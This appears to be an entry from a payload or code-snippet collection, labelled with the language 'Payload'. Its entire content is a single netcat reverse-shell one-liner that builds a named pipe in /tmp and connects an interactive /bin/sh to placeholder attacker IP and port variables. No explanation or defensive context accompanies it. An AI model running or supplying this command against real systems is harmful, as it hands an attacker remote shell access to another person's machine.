---
id: c4f5392e-2fa4-4201-90fb-523cecc8d673
type: code
language: Payload
verified: false
created_at: '2020-03-16T06:43:40.230082+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet c4f5392e

**Language**: Payload

```payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```


